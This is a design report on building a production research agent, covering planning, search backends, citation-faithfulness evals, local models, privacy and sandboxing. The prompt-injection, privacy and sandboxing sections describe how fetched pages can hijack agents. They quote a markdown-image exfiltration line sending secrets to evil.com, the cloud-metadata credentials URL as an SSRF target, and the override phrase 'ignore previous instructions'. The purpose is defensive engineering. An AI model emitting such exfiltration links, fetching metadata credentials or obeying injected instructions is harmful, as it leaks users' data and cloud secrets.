# Building a Production-Grade Research Agent: Architecture, Security, and a Citation-Faithfulness Eval

## TL;DR
- **Build a LangGraph plan → parallel-search → fetch → extract → verify → synthesize pipeline, and make citation faithfulness — not report "quality" — the headline metric.** The two-arm experiment (optional verification tool vs. mandatory verification node) is exactly the right call: it operationalizes the τ-bench Pass@k vs. Pass^k reliability framing, and the literature predicts the mandatory node will lift Pass^k (consistency) at similar Pass@1 (mean accuracy). That contrast IS the differentiator.
- **Prompt injection is unsolved; design for containment, not prevention.** A research agent is the untrusted-content leg of Simon Willison's lethal trifecta by definition, so the defense is architectural: strip the exfiltration leg (egress allow-listing, no markdown-image rendering, block 169.254.169.254/RFC1918), treat fetched content as data via spotlighting/datamarking, and don't give the fetcher access to secrets. Say plainly in the README that classifiers and "please ignore instructions" do not work.
- **Scope aggressively** Ship: a pluggable Search interface (Tavily + one fallback) behind a normalized result type, LiteLLM for multi-model, one local model (Qwen3) for free iteration, NLI-based citation verification, and the Pass@3/Pass^3 harness on 10–15 hand-labeled claims. Put OpenSearch/internal-index, MCP-per-backend, gVisor/microVM sandboxing, and CaMeL-style dual-LLM in the README as future work with concrete sketches.

---

## Key Findings

1. **What separates good research agents from mediocre ones is not the model — it's iteration control and state design.** In Anthropic's BrowseComp analysis, token usage *by itself* explained 80% of performance variance, with tool-call count and model choice as the other two factors (the three together explaining ~95%). Their multi-agent Research system — Claude Opus 4 lead + Claude Sonnet 4 subagents — outperformed single-agent Claude Opus 4 by 90.2% on their internal research evaluations, but at ~15× the token cost of a normal chat. Mediocre agents do shallow single-pass search or over-search without stopping criteria.

2. **The citation-faithfulness eval is well-grounded and is the strongest part of the plan.** Liu, Zhang & Liang (2023, arXiv:2304.09848) audited Bing Chat, NeevaAI, perplexity.ai, and YouChat and found "a mere 51.5% of generated statements are fully supported by citations (recall), and only 74.5% of citations support their associated statements (precision)" — and citation precision was *inversely* correlated with perceived utility. This is precisely the failure this eval catches and subjective quality rating misses.

3. **The Pass@k / Pass^k framing from τ-bench is real and load-bearing.** τ-bench (Yao et al., 2024, arXiv:2406.12045) introduced Pass^k — the probability that an agent succeeds on *all* k attempts. GPT-4o achieves ~61% Pass^1 on τ-retail (~35% on τ-airline), and "with increasing k, the chance of consistently solving a task drops rapidly, to as low as ∼25% for pass^8 on τ-retail." Pass^k = p^k decays exponentially, so a 90% Pass@1 agent is only ~73% at Pass^3. This makes Pass^3 a sensitive worst-case reliability signal — exactly what a "does enforced structure improve consistency" experiment needs.

4. **NLI-based verification beats LLM-as-judge for the actual support check.** Use an entailment model (source passage = premise, claim = hypothesis), not an LLM judge, for the claim-support decision — it's more reliable and cheaper, and avoids position/verbosity/self-preference bias.

5. **The search-backend abstraction and multi-model abstraction are the same design problem twice:** a normalized interface with per-provider adapters, config-driven selection, and fallback chains. LiteLLM solves it for models; a thin equivalent covers search.

---

## Details

### 1. Research Agent Architecture

**The pipeline.** The canonical loop is plan → (query decomposition) → search → fetch → extract → dedupe/rank → sufficiency check → (loop or) synthesize → cite → verify. The single biggest quality lever, per Anthropic's published post-mortem, is controlling *how much* the agent searches: in their BrowseComp evaluation token usage alone explained 80% of performance variance, tool-call count and model choice the rest. Their guidance embeds explicit scaling rules — simple fact-finding gets one agent with 3–10 tool calls, direct comparisons 2–4 subagents with 10–15 calls each, complex research 10+ subagents with divided responsibilities. Steal this: put effort-scaling heuristics in the planner prompt.

**Planner vs. flat ReAct.** For a research report with anticipated extensions, use an explicit plan-and-execute graph (LangGraph `StateGraph`), not a flat ReAct loop. A flat ReAct loop is fine for 1–3 step lookups but tends toward premature convergence — it grabs the first plausible answer and stops. An explicit plan node that writes a research brief and decomposes into sub-questions yields (a) traceable intermediate state, (b) natural parallelism boundaries, and (c) the seam where the mandatory-verification node lives. LangChain's `open_deep_research` is the reference implementation worth studying here: a supervisor-researcher architecture on `StateGraph`, MIT-licensed, with separate configurable models for summarization (gpt-4.1-mini default), research (gpt-4.1), compression, and final report. Its README notes it "Achieved #6 ranking on the Deep Research Bench Leaderboard with an overall score of 0.4344" (August 2, 2025; a 100-task, PhD-level benchmark scored by a Gemini LLM-as-judge RACE metric).

**Parallel vs. sequential.** Anthropic's orchestrator-worker pattern spawns 3–5 subagents in parallel, each with its own context window, each chasing one independent thread, synthesized by a lead agent with a separate citation pass. Parallelism is the main mechanism of the quality gain — it lets the system reason across more aggregate context than a single window holds. The tradeoff is the ~15× token multiplier (Anthropic: "multi-agent systems use approximately 15× more tokens than chat interactions"), and their published architecture has *no circuit breakers or per-run caps* — a subagent that recursively spawns more subagents can multiply cost 10× further. For this project: parallelize independent subqueries with `asyncio.gather` inside a single process (true multi-agent is unnecessary), and add a hard cap on total searches and total tokens. Multi-agent is bad for tightly interdependent tasks; it shines only on breadth-first decomposable ones.

**Stopping criteria.** Three approaches, use all three: (a) budget-based termination (max searches, max tokens, max wall-clock) as the hard backstop; (b) an LLM sufficiency check ("do the gathered findings answer every sub-question in the brief? list gaps"); (c) marginal-value heuristic (stop when a new search returns mostly already-seen sources). Over-searching and shallow single-pass search are the two poles to avoid.

**Contradictory sources, dedup, authority.** Deduplicate by canonicalized URL first, then by near-duplicate content (a cheap embedding cosine or even MinHash). For contradictions, don't silently pick one — represent disagreement in state (a `claim → [supporting sources], [contradicting sources]` structure) and surface it in the report. STORM's approach of explicitly mapping where perspectives disagree is a good model. Rank source authority with a simple, transparent heuristic (primary source > established publication > blog > forum), and record it in state rather than baking it into a prompt.

**Context-window management.** Summarize-before-synthesize: each fetched document gets compressed to claims + supporting quotes by a cheap model (map step) before the expensive synthesis model sees anything (reduce step). Map-reduce beats refine for research because refine serializes and accumulates drift; map-reduce parallelizes and keeps per-document provenance. Anthropic uses subagents "as intelligent filters" that condense before the lead synthesizes, and persists the plan to external memory when context exceeds 200K tokens.

**State for traceability.** Structure state so every claim is traceable to the fetch that produced it. A minimal shape:
```
ResearchState = {
  brief: str,
  subquestions: list[SubQ],
  sources: dict[source_id, {url, title, authority, fetched_at, raw, summary}],
  findings: list[{claim, source_ids, quotes:[{source_id, char_span, text}]}],
  contradictions: list[...],
  budget: {searches_used, tokens_used, caps},
}
```
This is also what makes citation verification mechanical — each finding already carries the exact quote spans to check.

**Open-source implementations worth studying and their honest tradeoffs:**
- **`langchain-ai/open_deep_research`** — best starting point for this stack; supervisor-researcher on LangGraph, MCP support, pluggable search/model config. Good: clean separation of concerns, MIT. Bad: heavier than this project needs, so it is worth stripping down.
- **GPT Researcher (`assafelovic/gpt-researcher`)** — mature, planner + executor, produces cited reports. Good: battle-tested retrieval and report generation. Bad: opinionated, harder to retrofit a mandatory-verification node cleanly.
- **STORM (`stanford-oval/storm`, Shao et al., NAACL 2024, arXiv:2402.14207)** — multi-perspective question-asking to widen coverage before writing; generates Wikipedia-style cited articles. Good: the perspective-guided question generation genuinely reduces blind spots; explicitly designed for citations; "over 70,000 people have tried STORM's online research preview" (storm.genie.stanford.edu). Bad: tuned for long encyclopedic articles, not decision-oriented reports; the authors note output still needs significant editing.
- **Google `gemini-fullstack-langgraph-quickstart`** — clean LangGraph reference with an iterative "reflect and search more" loop, Apache-2.0. Good teaching example of the sufficiency-check loop.
- **local-deep-researcher / ollama-deep-researcher** — the same iterative loop wired to local models via Ollama; directly relevant to the free-iteration goal.
- **Perplexica / Morphic** — Perplexity-style search UIs; Perplexica pairs with SearXNG. Good: show the search→cite UX; less relevant as agent-architecture references. ByteDance `deer-flow` and `dzhng/deep-research` round out the landscape — deer-flow builds explicit multi-step plans (better coverage than single-query designs), which the DEEPRESEARCHGUARD paper (arXiv:2510.10994) integrates with.

**Named failure modes to call out in the README:** shallow single-pass search; over-searching (no stopping criteria); **source laundering** (citing a blog that cites a paper instead of the paper — mitigate by preferring primary sources and following citation chains); recency bias; and premature convergence on the first plausible answer (mitigate with the sufficiency check + multi-perspective decomposition).

### 2. Prompt Injection Resistance

**Framing.** A research agent ingests untrusted web content by definition, so it permanently occupies the untrusted-content leg of Simon Willison's **lethal trifecta** (private data + untrusted content + external communication; coined June 16, 2025). The consensus across Willison, Google DeepMind, Microsoft, and the OWASP LLM Top 10 (LLM01: Prompt Injection) is blunt: **prompt injection is not solved.** An LLM cannot reliably distinguish instructions from data because both arrive as the same token stream. Design for containment. The single most useful action is to *cut the exfiltration leg* — every published allow-list has eventually been bypassed, but egress restriction is still the cheapest, highest-value control.

**Attack surface via fetched pages:** hidden text (white-on-white, `display:none`/CSS-hidden divs), HTML comments, image `alt` text, unicode/zero-width tricks, and instructions embedded in PDFs. Stripping HTML to text removes CSS-hidden styling cues but does **not** remove the *text content* of hidden divs, comments that survive extraction, or unicode payloads — so "strip to text" is necessary but insufficient.

**What actually helps (in rough order of value):**
- **Egress allow-listing / cutting exfiltration** — block outbound requests to anything but the search/LLM providers; never auto-render markdown images in output (the classic exfil vector — see §6); block 169.254.169.254 and RFC1918. This is architectural and robust.
- **Treat tool output as data, never instructions**, and **spotlight/datamark** it. Microsoft's spotlighting (Hines et al., 2024, arXiv:2403.14720) has three modes: delimiting, datamarking (interleave a special token throughout untrusted text), and encoding (base64/ROT13). Reported: "With GPT-3.5-Turbo, ASR is reduced from approximately 50% to below 3%" with datamarking; encoding "brings ASR to 0.0%, or quite close" — with negligible task-performance impact. This is cheap to implement and worth doing.
- **Structured/typed tool outputs** and **domain allow-listing** for fetches.
- **Dual-LLM / CaMeL** (Willison's Dual-LLM pattern; Google DeepMind's CaMeL, April 2025) — a privileged LLM that plans and never sees untrusted content, and a quarantined LLM that processes untrusted content with no tool access, mediated by a capability-enforcing interpreter. This is the strongest *architectural* defense but is heavy; put it in the README as future work with a sketch.
- **Prompt-injection classifiers/guardrails** (Lakera, Rebuff, Meta PromptGuard, Meta LlamaFirewall, Microsoft Prompt Shields) — use as defense-in-depth only. They catch known patterns, not the infinite rephrasings; Willison's "99% is a failing grade" applies.

**What does NOT work:** asking the model nicely to ignore instructions in content; relying on a classifier as the sole defense; assuming HTML-stripping removes injection.

**How to test it:** run against **AgentDojo** (Debenedetti et al., NeurIPS 2024 — 97 realistic tasks, 629 security test cases, reports Attack Success Rate and Utility-under-attack) and **InjecAgent** (Zhan et al., 2024 — direct-harm and data-stealing splits). Note recent results that adaptive attacks break most defenses (arXiv:2503.00061; "The Attacker Moves Second," Nasr/Carlini et al., 2025) — so report ASR honestly rather than claiming robustness. For this project, a small hand-built injection corpus (hidden-div "ignore previous instructions," alt-text payload, PDF injection, a fake-citation-laundering page) demonstrated in the eval is more than sufficient and shows security maturity.

### 3. Pluggable / Switchable Search Backends

**Abstraction design.** A single `SearchBackend` protocol, per-provider adapters, result normalization to one type, config-driven selection, and a fallback chain with rate-limit handling:
```python
class SearchResult(TypedDict):
    title: str; url: str; snippet: str
    content: str | None      # full clean text if provider returns it
    published: str | None; source_authority: float | None
    backend: str             # provenance for citations

class SearchBackend(Protocol):
    async def search(self, query: str, k: int) -> list[SearchResult]: ...
```
The key design decision: normalize so that an *internal-index* result carries the **same citation metadata** (url/title/quote-able content) as a web result — that's what lets the citation layer and report format stay backend-agnostic when the system later points at internal docs.

**Provider landscape (mid-2026) and tradeoffs:**
- **LLM-optimized (return clean content, not just links):** Tavily (agent-optimized search+extract in one call; ~$8/1k basic, advanced search costs 2 credits so effectively doubles; 1,000 free credits/mo; acquired by Nebius Feb 2026 but still shipping), Exa (neural/embeddings semantic search, ~$5–7/1k plus ~$1/1k for page contents, 20k free/mo), Brave Search API (own independent index, flat ~$5/1k, prices like a search engine), Linkup (native parallel search, ZDR by default), Firecrawl (search+scrape+crawl+map, JS rendering and anti-bot, ~$1.66/1k search + $0.83/1k extract on Standard).
- **Raw SERP (cheaper per query, more tokens downstream):** Serper (resells Google, ~$50/mo for 50k, 1–2s latency, 2–4s on retry), SerpAPI (20+ engines, ~$9–25/1k), Google Programmable Search, DuckDuckGo/ddgs.
- **Extraction specialists:** Jina Reader, Firecrawl — pair a cheap SERP (Serper) with Jina Reader to cut cost dramatically (one comparison: 10k searches + 10k extractions = $96 on Tavily vs. $11 on Serper+Jina).
- **Bing:** the Bing Search API has been on a retirement path; do not build new work on it.
- **Recommendation:** default to **Tavily** (clean content, one call, generous free tier, native LangChain integration) with **one fallback** (Brave or DuckDuckGo) to prove the abstraction and fallback chain work. Raw-SERP-plus-extractor is the cost-optimization story for the README.

**SearXNG in depth.** Self-hostable metasearch with a JSON API (`/search?q=...&format=json`) returning `title/url/content/engine` per result — a genuinely good "free aggregator" option. **But the reliability caveat is real and specific:** SearXNG's bot-detection limiter is designed to reject non-browser clients. With the limiter on, plain HTTP clients (curl, python-requests, an agent) get 429 on every route — one measurement showed 25 plain-client requests returned 429 every time, while browser-shaped requests were served 15 times then throttled at a burst ceiling. The limiter inspects User-Agent, `Accept-Language`, `Sec-Fetch-*`, and `Accept-Encoding` headers, and needs Redis/Valkey for the dynamic IP methods. For programmatic agent use on a **private** instance, set `limiter: false` (and `formats: [html, json]`), and understand that SearXNG itself is passing those queries through to upstream engines that may CAPTCHA/block *it*. Verdict: fine for a self-hosted, private, moderate-rate agent loop; not reliable enough to depend on as the only backend for a graded run — keep a paid fallback.

**Internal index (OpenSearch/Elasticsearch).** For pointing the same interface at private docs, OpenSearch is the strong choice. Use **hybrid search**: BM25 (exact matches, identifiers, product codes) + k-NN dense vectors (semantic), combined via a search pipeline with a normalization processor (min-max) and weighted combination — GA since OpenSearch 2.10, best on 2.12+. OpenSearch bundles k-NN, ML Commons (remote embedding connectors to OpenAI/Bedrock/Cohere so the app never embeds text itself), and Neural Search plugins. Elasticsearch's equivalent is Reciprocal Rank Fusion (RRF), which fuses by rank rather than score. Index design: store `title`, `url`/`doc_id`, `body` (BM25), `embedding` (k-NN dense field), plus authority/recency metadata — mapping each hit into the same `SearchResult` so internal-doc citations carry url/quote metadata identically to web results.

**MCP as the abstraction boundary.** An MCP server per search backend is architecturally clean and `open_deep_research` supports it natively — it decouples backends from the agent process and lets non-code users reconfigure. But for prototype it's over-engineering: MCP adds a process boundary, transport, and serialization overhead for zero functional gain over a Python `Protocol`. Recommendation: use a plain in-process interface now; note in the README that each adapter can be lifted behind an MCP server for a multi-team/production deployment, which is a genuinely good fit when backends are owned by different teams.

### 4. Accurate Citation — the core of the eval

**Attribution architectures, from weakest to strongest:**
- **Generate-then-attribute (post-hoc):** model writes, then citations are found for each sentence. Higher coverage, lower correctness; prone to fabricated citation numbers.
- **Retrieve-then-generate-with-inline-citations:** model cites as it writes from provided sources. This is the standard RAG pattern (ALCE).
- **Post-hoc verification:** independently check every claim-source pair after generation. This is what the eval measures, and combining inline-citation generation *with* a post-hoc verification pass is the strongest practical design.

**Span-level grounding.** Anchor claims to exact source text via quote extraction and character offsets so citations are *checkable*. **Anthropic's Citations API** (GA 2025) does this natively: it chunks supplied documents, and each response text block carries citations pointing to specific locations (character ranges for text, page numbers for PDFs) with a `cited_text` field that is *extracted from the source, not generated* — so it's guaranteed to point at real source text. This can be replicated on any model with `<CIT chunk_id=... sentences=...>` tags + parsing, but the Anthropic feature removes the fabrication risk at the API layer. This is the mechanism that makes "quote matching / char-offset anchoring" real rather than aspirational.

**Citation hallucination rates — the motivating evidence.** Liu et al. (2023, arXiv:2304.09848) found only **51.5% of generated statements were fully supported by their citations** (recall) and only **74.5% of citations supported their associated statement** (precision) across four commercial generative search engines — and precision was *inversely correlated with perceived utility*. Reference-fabrication studies report hallucination rates from 14% to 95% across vendors depending on task. This is the exact gap the eval quantifies.

**Automatic evaluation of attribution:**
- **ALCE** (Gao et al., EMNLP 2023, arXiv:2305.14627) — the first automatic citation benchmark; defines **citation recall** (does the union of cited docs entail the sentence?) and **citation precision** (does each cited doc support its statement?), computed with the **TRUE** NLI model. ALCE's automatic metrics reach 85.1% accuracy for citation recall and 77.6% for precision against human gold labels; human inter-annotator agreement was 0.698 (recall) and 0.525 (precision). On ELI5, even the best models lacked complete citation support 50% of the time.
- **AIS (Attributable to Identified Sources)** (Rashkin et al., Computational Linguistics 2023, arXiv:2112.12870) — the framework defining attribution via the "According to P, s" test; **AutoAIS** is its automated NLI version and correlates strongly (system-level r ≈ 0.96) with human ratings.
- **FactScore** (Min et al., EMNLP 2023, arXiv:2305.14251) — "breaks a generation into a series of atomic facts and computes the percentage of atomic facts supported by a reliable knowledge source" (factual *precision*).
- **RAGAS faithfulness** (Es et al., arXiv:2309.15217) — decomposes the answer into statements via an LLM, then checks each against retrieved context; score = supported claims / total claims, 0–1. On the WikiEval dataset it reached 0.95 agreement with human annotators for faithfulness — but note independent critiques (e.g. arXiv:2605.23024) of its discriminant validity in harder settings.
- **TRUE / NLI entailment** (Honovich et al., 2022) — the checkpoint `google/t5_xxl_true_nli_mixture` is a T5-11B fine-tuned on a mixture of NLI datasets; source passage = premise, claim = hypothesis, score = P(entailment), threshold ≥ 0.5.

**Use NLI, not an LLM judge, for the support decision.** LLM-as-judge has documented **position bias, verbosity bias, and self-preference bias** (Zheng et al.'s MT-Bench established the three; reinforced widely since), and on longer-evidence attribution its zero-shot macro-F1 drops to 60–70% (AttributionBench). NLI-fine-tuned models (T5-XXL-TRUE, Flan-T5) match or beat GPT-3.5/4 on attribution tasks — AttributionBench notes fine-tuned GPT-3.5 "still underperforms smaller models including FLAN-T5 (11B) and Flan-UL2 (20B)." **For this eval:** hand-label the ~10–15 claim-support pairs (the gold set), and for the *automated* verifier prefer a DeBERTa/T5 NLI entailment model over an LLM judge; if an LLM judge is unavoidable, calibrate it against the human labels, randomize option order (position-bias mitigation), length-normalize (verbosity), and prefer a cross-family judge (self-preference), then report the agreement. A key ALCE limitation to note: NLI models struggle to detect *partial* support, inflating false positives on loosely-related citations.

**Multi-source claims and "not supported."** For claims synthesized from multiple sources, check whether the *union* of cited passages entails the claim (ALCE's recall definition). Critically, **represent "this claim is not supported" as a first-class state** rather than forcing a citation — a research agent that abstains or flags an unsupported synthesis is more trustworthy than one that fabricates attribution. Track and prefer **primary over secondary sources** to counter source laundering.

**How this wires into the two-arm experiment.** Arm A (verification is an optional tool the model may call) vs. Arm B (verification is a mandatory graph node every claim passes through) is a clean test of whether enforced structure improves consistency. The τ-bench result — that consistency (Pass^k) collapses even when mean capability (Pass@k) is high — predicts Arm B will show *similar Pass@1 but meaningfully higher Pass^3*, because the mandatory node removes the stochastic "did the model choose to verify this time?" variance. Report per-arm: mean citation-faithfulness accuracy over 3 runs (Pass@3 framing) and the fraction of claims that pass in *all* 3 runs (Pass^3). That's a publishable-quality finding.

### 5. Multi-Model / Multi-Provider Including Local

**Abstraction.** Use **LiteLLM** as the model gateway — it exposes an OpenAI-compatible interface over 140+ providers ("1,892 models" per its site), so agent code calls one interface and models are switched by config. LangChain's `init_chat_model` is the in-framework equivalent and integrates directly with LangGraph. OpenAI-compatible `/v1` endpoints are the lingua franca — Ollama, vLLM, LM Studio, and OpenRouter all speak it, so "point `base_url` at localhost" is the whole local-model story. **OpenRouter** is the hosted "one key, many models" option with automatic cost routing and failover; **LiteLLM** is the self-hosted equivalent, run inside the deployment’s own network (better for data residency — request data never leaves that network before reaching the provider).

**Local models for agentic tool-calling in 2026 — honest limits.** The capability exists but hasn't fully closed the gap. For tool calling, the models that reliably work locally are **Qwen3 (32B / 30B-A3B MoE), Qwen3-Coder 30B, Gemma 4 27B, GLM-4.7 32B, and Llama 3.3 70B** — Llama 3.3 70B has the highest ceiling (~97% well-formed tool-call rate) but wants 48GB+ VRAM. Realistic reliability: ~90%+ well-formed calls on simple workloads, but **80–90% end-to-end on multi-step workflows** after compounding selection and argument errors. The failure nobody advertises is **self-termination** — small models struggle to recognize "the tool succeeded, I'm done" and stop looping. For structured/JSON output, Ollama and llama.cpp can constrain output at the token level (grammar/`format` param), so JSON *validity* is solvable; Qwen3 is the strongest native-JSON pick. Below ~7B, models lose coherence past 2–3 steps.

**Model routing strategy.** Route by task: cheap/local model (Qwen3) for extraction, per-document summarization, and NLI-style checks; frontier model (Claude/GPT) for planning and final synthesis where reasoning matters most. This is exactly how `open_deep_research` splits its four model roles. The practical gap: frontier models are meaningfully better *planners* and *synthesizers* for multi-step research; use local models for the high-volume, low-judgment map steps.

**Provider differences.** Tool-calling schemas differ (OpenAI tools vs. Anthropic tools vs. XML) — LiteLLM normalizes most of this, but test each model's actual tool-call adherence rather than trusting the abstraction. Structured-output support varies; use a library (Instructor, Outlines) or the provider's native JSON-schema mode.

**Keeping evals comparable and cheap.** Run the *same* eval harness (same 10–15 labeled claims, same NLI verifier) across models so scores are comparable. **Debug and iterate the entire pipeline on a local model first** (Qwen3 via Ollama) — free, and it surfaces tool-calling/JSON bugs — then spend API budget only on the final graded runs across the two arms. This directly serves the "free iteration" constraint.

### 6. Privacy

**(a) Not leaking data outward.** Know what goes where: search *queries themselves leak intent* to the search provider (a query like "acquisition due diligence CompanyX" is sensitive), and full prompts/context go to the model provider. Mitigations, strongest first: **self-host the model** (nothing leaves the network — the strongest solution, and why local models matter beyond cost); use **Zero Data Retention** endpoints (OpenAI ZDR forces `store=false` and excludes content from abuse-monitoring logs; Anthropic offers retention controls — note Anthropic has moved to a 30-day retention posture for some business customers, so verify what's contractually enabled on *the* key; both are SOC 2 Type II); **redact/scrub PII before sending to external APIs**, done as early as possible in the pipeline, ideally at a LiteLLM/proxy layer so it's centralized; and prefer providers that don't train on API data by default. Search-provider privacy: Linkup defaults to ZDR and offers bring-your-own-cloud; self-hosted SearXNG keeps queries in-house (a real privacy win for the internal-index case).

**(b) Not leaking data OUT via the agent.** The classic vector is **markdown-image exfiltration**: an injected instruction makes the model emit `![](https://evil.com/steal?data=<secrets>)`, and a UI that auto-renders it fires a GET carrying the data. This exact class has hit ChatGPT, Microsoft Copilot, GitHub Copilot Chat, Slack AI, Google Bard, and Claude.ai — every vendor shipped a fix (usually server-side image proxying / CSP / host allow-listing). Anthropic's `web_fetch` was hardened so it can only navigate to exact URLs the user entered or that came from its own `web_search`, after a disclosed exfil hole (they "closed the hole by removing the ability for web_fetch to navigate to additional links returned within its own fetched content"). Mitigations for the agent: **do not auto-render markdown images** in output; **egress allow-list** outbound requests; treat crafted URLs and outbound requests as exfiltration channels. Network-layer egress filtering is the backstop that holds when prompt-level defenses fail — but note it can't see data encoded inside a legitimate-looking API call, so pair it with not rendering images and not giving the fetcher secrets.

**Local-first / internal-index changes.** When the index is internal and the model is self-hosted, the external-leak surface largely collapses — the remaining risk is *internal* exfiltration (the agent reaching internal services it shouldn't), which is an egress/SSRF problem (§7), plus the lethal-trifecta concern that private-index data + injected web content + any outbound channel = exfil risk.

### 7. Sandboxing and Containerization

**Threat model for a research agent:** (1) arbitrary untrusted web content (prompt injection), (2) possibly LLM-generated code execution if a code tool is added, (3) **SSRF** — the agent fetches attacker-influenced URLs, so any `fetch_url` tool is a potential path to the cloud metadata endpoint. This last one is the sharp risk: a poisoned tool argument or injected instruction can make the agent fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and hand back IAM credentials (the 2019 Capital One breach shape).

**SSRF defense — the highest-value control, and cheap:**
- Block the cloud metadata IP (169.254.169.254), loopback (127.x), and all RFC1918 ranges (10.x, 172.16–31.x, 192.168.x) plus IPv6 link-local (fe80::) and ULA (fc00::/7).
- **Resolve the hostname, check *all* resolved IPs against the denylist, then pin the resolved IP for the actual fetch** to prevent DNS-rebinding TOCTOU (first resolution returns a public IP, second returns 127.0.0.1). Re-apply policy on every redirect hop.
- Blocklists alone are a losing game (decimal IP notation, IPv6 equivalents, rebinding) — an explicit *allowlist* of destinations is stronger where feasible, but a research agent needs the open web, so the practical answer is a denylist of private ranges + IP pinning + redirect re-checking. Enforce IMDSv2 (`HttpTokens=required`) so SSRF that can't send headers can't reach metadata.

**Container/pod controls (production):** run non-root, read-only root filesystem, drop all capabilities, seccomp/AppArmor profile, resource limits, and — most importantly — **Kubernetes NetworkPolicies that deny egress by default** and allow only the search/LLM provider endpoints (block both IPv4 and IPv6 metadata endpoints cluster-wide). Prefer IRSA/workload identity over node-role credentials.

**Stronger isolation:** container isolation shares the host kernel, so for executing untrusted *code* consider **gVisor** (user-space kernel, syscall interception), **Kata Containers** (lightweight VM per pod), or **Firecracker microVMs** (the strongest boundary, used by AWS Lambda). For a research agent that only *fetches* (no code execution), microVM isolation is generally unnecessary — egress control matters more than kernel isolation.

**Browser/fetcher isolation:** if a headless browser renders JS-heavy pages, run it in its own container with its own restricted network egress, so a malicious page can't reach secrets or the internal network.

**Proportionate answer for a prototype:** a pod, gVisor, and per-run ephemeral containers are **not** needed to demo this. What's warranted:
- Run the fetcher through an **SSRF guard function** (denylist private ranges + metadata IP, pin resolved IP) — ~30 lines, high signal, and it shows the threat is understood.
- Do **not** render markdown images; egress is implicitly limited because the agent only calls known providers.
- Run in a plain Docker container (non-root, read-only FS) if time permits — a good README artifact.
- **README as future work:** Kubernetes NetworkPolicy egress-deny, gVisor/Kata/Firecracker for any code-execution tool, per-run ephemeral containers, browser-in-its-own-container. State explicitly that per-run ephemeral containers are worth it in production (clean blast radius per untrusted-content run) but overkill at this stage.

---

## Recommendations

**Stage 1 — Ship prototype:**
1. LangGraph plan → parallel-search → fetch → extract/summarize → synthesize-with-inline-citations → **verify** graph. Cap total searches/tokens.
2. `SearchBackend` protocol with Tavily + one fallback; normalized `SearchResult` carrying citation metadata.
3. LiteLLM gateway; run/debug everything on **Qwen3 via Ollama** (free), final graded runs on the provided frontier key.
4. Citation verification with an **NLI entailment model** (source span = premise, claim = hypothesis). Represent "not supported" explicitly.
5. **The eval:** hand-label 10–15 claim-support pairs; run each arm 3×; report **Pass@3 (mean faithfulness accuracy) and Pass^3 (fraction of claims passing all 3 runs)**.
6. **Two-arm experiment:** Arm A = verification as optional tool; Arm B = verification as mandatory node. Report whether Arm B lifts Pass^3 at similar Pass@1.
7. SSRF guard on the fetcher (block 169.254.169.254 + RFC1918, pin resolved IP); no markdown-image rendering.
8. A small injection test corpus (hidden div, alt-text, PDF, source-laundering page) run through the eval.

**Stage 2 — README as future work (with concrete sketches, not hand-waving):** OpenSearch hybrid-search internal index behind the same `SearchBackend`; MCP-per-backend; CaMeL/dual-LLM containment; Anthropic Citations API for guaranteed span-level quotes; Kubernetes NetworkPolicy egress-deny + gVisor/Firecracker for a code tool; per-run ephemeral containers; AgentDojo/InjecAgent for systematic injection testing.

**Benchmarks/thresholds that change the plan:**
- If Arm B's Pass^3 is *not* higher than Arm A's, the "enforced structure improves consistency" thesis is falsified for this task — report that honestly; it's still a strong finding.
- If the NLI verifier's agreement with the human labels is below ~80% (ALCE's automatic-metric accuracy is the benchmark to beat), don't trust the automated numbers — fall back to human labels for the graded claims and note the verifier's limits.
- If local-model tool-calling reliability drops below ~80% end-to-end, stop using it for the agent loop and reserve it for extraction/summarization only.
- If a single search backend's failure/429 rate is material (SearXNG especially), the fallback chain earns its place; otherwise keep it simple.

---

## Caveats

- **Prompt injection is genuinely unsolved.** Every defense here is mitigation, not prevention; adaptive attacks (Nasr/Carlini 2025) break most published defenses. Frame the security section as containment and honest ASR reporting, never as "solved."
- **LLM-as-judge for faithfulness is unreliable** (position/verbosity/self-preference bias); this is why the plan leans on NLI entailment and human-labeled gold. Even NLI models miss *partial* support and inflate false positives on loosely-related citations.
- **Vendor/pricing facts move fast.** Tavily was acquired by Nebius (Feb 2026); Bing Search API is on a retirement path; local-model rankings (Qwen3, Llama 3.3, GLM, Gemma) shift monthly. Treat specific prices and model names as of mid-2026 and re-verify before committing.
- **Anthropic's 90.2% and 15× figures are from their own internal eval / BrowseComp analysis**, not an independent third-party benchmark — directionally credible (token usage explaining 80% of variance is a robust, repeatedly-cited finding) but not externally verified.
- **RAGAS faithfulness's 0.95 human agreement is on the easy WikiEval set** (50 Wikipedia pages, 95% inter-annotator agreement); independent work (arXiv:2605.23024) questions its discriminant validity in harder settings. Don't over-index on any single automated metric — the point of hand-labeling is precisely to keep a human anchor.
- **A prototype cannot do all of this.** The recommendations deliberately separate the shippable core from README future-work; attempting the full production architecture in the time budget is the failure mode to avoid.